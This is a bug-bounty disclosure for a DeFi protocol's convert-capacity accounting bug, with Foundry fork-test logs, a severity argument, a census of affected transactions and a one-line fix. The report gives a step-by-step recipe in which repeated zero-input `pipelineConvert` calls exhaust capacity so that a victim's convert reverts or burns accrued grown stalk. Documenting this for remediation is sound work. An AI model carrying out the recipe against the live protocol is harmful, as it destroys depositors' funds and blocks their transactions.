  deposit now carries 8760 seasons of grown stalk
  victim base stalk (units): 418973362940000000000
  victim base stalk (Stalk): 41897
  victim accrued grown stalk (units): 2332144906137420656542
  victim accrued grown stalk (Stalk): 233214
  grown / base (bps): 55663
  ----------------- baseline: identical pipelineConvert, penalty-free -----------------
  overallCappedDeltaB: -834987597737
  overallCurrentDeltaB: 59748054141
  capacityLeft (getOverallConvertCapacity): 834987597737
  overallConvertCapacityUsed: 0
  PRE 
    overallCurrentDeltaB: 59748054141
    overallCappedDeltaB: -834987597737
    getOverallConvertCapacity: 834987597737
    cappedDeltaB(well): -779155440926
    used(overall): 0
    well totalSupply: 28412230931458533568791
  POST
forge : Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
At line:1 char:90
+ ... "shanghai"; forge test --match-contract MainTest --fork-url https://a ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Warning: the fo...uture versions::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
 
  revertTo(uint256): replaced by `revertToState`
  snapshot(): replaced by `snapshotState`
    overallCurrentDeltaB: 39210813357
    overallCappedDeltaB: -834987597737
    getOverallConvertCapacity: 814183214797
    cappedDeltaB(well): -779155440926
    used(overall): 20804382940
    well totalSupply: 28781747230134858790004
  [diag] oldBdv: 41879338033
  [diag] toBdv: 83222832629
  [diag] grownPre: 2332144906137420656542
  [diag] balanceOfStalk after: 3164553215037420656542
  [diag] germinating after: 0
  [diag] grown after (same token): 0
  baseline grown carried (units): 2332144906137420656542
  baseline grown carried (Stalk): 233214
  baseline expected stalk (formula): 3164373232427420656542
  baseline actual stalk credited: 3164553215037420656542
  baseline actual - expected (units): 179982610000000000
  baseline output (BEAN wei): 369516298676325221213
  ----------------- attacker: one real seed convert, then free doubling -----------------
  capacity used (after attacker seed): 2615320698
  zero-input call -> capacity used: 5230641396
  zero-input call -> capacity used: 10461282792
  zero-input call -> capacity used: 20922565584
  zero-input call -> capacity used: 41845131168
  zero-input call -> capacity used: 83690262336
  zero-input call -> capacity used: 167380524672
  zero-input call -> capacity used: 334761049344
  zero-input call -> capacity used: 669522098688
  zero-input call -> capacity used: 1339044197376
  zero-input calls to exhaust: 9
  ----------------- victim's identical pipelineConvert SUCCEEDS but is slashed -----------------
  PRE 
    overallCurrentDeltaB: 57196053695
    overallCappedDeltaB: -834987597737
    getOverallConvertCapacity: 0
    cappedDeltaB(well): -779155440926
    used(overall): 1339044197376
    well totalSupply: 28458682855889022863260
  POST
    overallCurrentDeltaB: 36624423260
    overallCappedDeltaB: -834987597737
    getOverallConvertCapacity: 0
    cappedDeltaB(well): -779155440926
    used(overall): 2698893213327
    well totalSupply: 28827603733382321427605
  [diag] oldBdv: 41879338033
  [diag] toBdv: 83088731271
  [diag] grownPre: 2332144906137420656542
  [diag] balanceOfStalk after: 2579259950404887663318
  [diag] germinating after: 0
  [diag] grown after (same token): 0
  victim grown stalk carried at slash (units): 2332144906137420656542
  victim grown stalk carried at slash (Stalk): 233214
  victim total stalk before convert (units): 2751118269077420656542
  victim total stalk before convert (Stalk): 275111
  expected stalk (formula): 3163032218847420656542
  baseline identical convert (no capacity exhaustion): 3164553215037420656542
  actual stalk credited after convert: 2579259950404887663318
  GROWN STALK BURNED vs baseline (units): 585293264632532993224
  GROWN STALK BURNED vs baseline (Stalk): 58529
  burned / carried grown (bps, 10000 = all): 2509
  burned / victim TOTAL stalk incl grown (bps): 2127
  convert succeeded, output (LP wei): 368920877493298564345

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 182.79s (344.24s CPU time)

Ran 1 test suite in 184.48s (182.79s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
``
## Attack recipe (realistic, one block; steps 1–2 observed on live fork)

1. Attacker calls `pipelineConvert` with `amounts = [0]`, empty pipes, having pre-transferred the output token to `C.PIPELINE` (T4; live run: 7 calls) — each call doubles `used` at gas cost only: the donation returns as convert output (`toAmount`), so net cost ≈ gas. Observed live: `used` 11,216,172,610 → 1,435,670,094,080 ≥ cap 834,443,796,624 in 7 calls.
2. In the same block, a victim's convert executes with `penalty = dir > 0` because `used ≥ cap`:
   - **standard path (proven live)**: convert reverts `Convert: Non-zero Stalk Penalty` — victim's real re-deposited position (21,906.69 LP of whitelisted BEAN/USDC well) denied a convert that its own baseline (same block, same parameters) executed successfully;
   - **pipeline path (proven in differential suite T3, and proven live on fork in `testBug2` 2026-10-01)**: convert "succeeds" but `newGrown = initialGrown * (newBdv - penalty) / newBdv` destroys carried grown stalk — live canonical run: 585,293,264,632,532,993,224 units (58,529 Stalk) destroyed = 2,509 bps of carried grown / 2,127 bps (21.27%) of the victim's entire Stalk position, on a 41,879.34-BEAN position aged 8760 seasons, while `getOverallConvertCapacity` still read 0 and the victim's own identical baseline convert minutes earlier credited 3,164,553,215,037,420,656,542 units penalty-free;
3. Under the correct model (`used += dir`), step 1 leaves `used` at `sum(dirs)` (0 growth from zero-input calls; ≤ 6.9% of cap in T3) and the victim's penalty is 0 (baseline equality in T2/T3, live baseline in the fork run).

## Severity — argument for HIGH (fork proof submitted)

**HIGH — fund loss (grown-stalk destruction) + denial of converts on real deposited principal.**

- **The victim's stake is principal, not future yield.** The denied convert moves a real Silo deposit: 21,906.69 LP (whitelisted BEAN/USDC well) deposited as principal via `deposit()` and germinated over two live `sunrise()` seasons. This is the victim's staked capital in the Silo, and the convert is the mechanism that re-prices/repositions it (peg-driven rate protection). It is not a projection of emissions.
- **The loss leg with a direct asset: grown-stalk destruction** (pipeline path, T3): 1,957,878,752,000,000 stalk units destroyed on a convert the protocol's own model still priced as legal (`maxAmountIn` unchanged at exhaustion). Grown stalk is accrued emissions + governance entitlement — already-accrued value, not future yield.
- **The denial leg is demonstrated on live state** with genuine counters: capacity genuinely read 834,443,796,624 at block start, genuinely read 0 after 7 free calls, and the victim's convert — identical to its own successful baseline minutes earlier in the same block — genuinely reverted. Under correct accounting, all attacker writes are 0 and the victim converts successfully.
- **Attacker cost is gas only** (T4: donation returned as convert output; no position needed), permissionless, deterministic within one block, and re-armable every block (the counter is keyed per block by design).
- **Dedupe-cleared** (below), deployment-equivalence-proven (step 1), local suite regression-green.

Honest scoping (updated 2026-10-01): **both legs are now proven on live fork state.** The revert leg was proven 2026-09-30 (`poc/bs031_poc_output_final.txt`); the pipeline slash leg was proven 2026-10-01, canonical run `poc/bs031_poc_output_canon.txt` (`MainTest` suite **2/2 PASS**: testBug1 + testBug2): baseline identical convert credited 3,164,553,215,037,420,656,542 units penalty-free (capacity `used=0`), attacker then exhausted capacity with 1 seed convert (used 2,615,320,698) + 9 exactly-x2 zero-input calls (`used` 1,339,044,197,376 >= cap 834,987,597,737, every step asserted equal to `2x`), and the victim's identical convert succeeded while crediting only 2,579,259,950,404,887,663,318 units - **585,293,264,632,532,993,224 units (58,529 Stalk) destroyed**, 2,509 bps of carried grown / 2,127 bps (21.27%) of the victim's entire Stalk position (41,879.34 BEAN principal + 233,214 accrued Stalk aged 8,760 seasons; the 2,509/2,127 bps ratios are identical on every fork block - deterministic once capacity is exhausted). Burn is measured against the reverted baseline identical convert (`baselineStalk - actual`), formula-independent; the ~+0.006% upward baseline rounding bias is absorbed by a `diff*1000 <= expected` tolerance (a penalty can only reduce the credit, so upward bias cannot mask one). What remains is severity honesty, not mechanism: see the census below.

## Victim surface — on-chain census (blocks 210,585,218 → 510,585,219, ~300M blocks ≈ 2.4 years)

The capacity system gates exactly two convert kinds (`BEANS_TO_WELL_LP`, `WELL_LP_TO_BEANS` — `LibPipelineConvert:159-160,189-190`); everything else (unripe, chop, lambda, enroot) never touches it. Full-history scan of every `Convert` event (364 events / 334 unique txs; raw `poc/bs031_convert_census.json`, probes `bs031_probe7_classify_txs.py` / `bs031_probe9_convert_census.py`):

| population | count | notes |
|---|---|---|
| unripe/chop/lambda (non-capacity) | 292 | outside the gated system |
| WELL→BEAN standard path | 38 | all `farm(bytes[])` → inner `convert(bytes,int96[],uint256[])` — revert leg only (DoS, Law-11 class) |
| WELL→WELL `pipelineConvert` | 4 | 3 via diamond batches (`0x36bfafbd`, blocks ~268.9–269.2M), 1 via external contract (`0xbc69773b…`, block 432,168,288) |
| BEAN→WELL pipeline/standard | 0 | the slash direction used in `testBug2` has no observed production users |
| direct top-level `pipelineConvert` txs | 0 | all usage is nested in `farm` batches or external contracts |
| capacity-relevant converts, last 60M blocks (~6 months) | 0 | system currently dormant in practice |

Severity qualification (facts, not spin): the **revert leg alone is DoS** (Law-11 dead class — victim tx reverts, no value moves). The **fund-loss leg is real and fork-proven** (accrued grown stalk destroyed, permanently), but its reachable victim set in 2.4 years of production is **4 transactions**, and the attacker captures nothing from either leg (every extraction angle is logged dead in the findings ledger: penalty recipient, pro-rata share shift, cheaper unblocked ops, H1 soil, H2 same-block poisoning). HIGH therefore rests on the program accepting *victim-side fund destruction without attacker profit* (griefing-with-capital-loss) as in-scope fund-loss; a program that requires attacker gain or closes griefing classes will land this materially lower. We submit the mechanism proof + census and state this openly rather than argue around it.

## Dedupe

18 audit PDFs + BIR/EBIP/prior-reports corpus: the capacity system (EBIP-19) is covered only for `blockNumber` keying; no double-count / `applyStalkPenalty` / `pdCapacity` hit anywhere (`findings.md` BS-031 row: dup? CLEARED).

## Fix (one line)

Store the already-computed new value instead of adding it again: `convertCap.overallConvertCapacityUsed = pdCapacity.overall;` (same for the per-well fields), or have `calculateConvertCapacityPenalty` return the delta only. Add a regression test asserting `used == Σdir` after N converts.
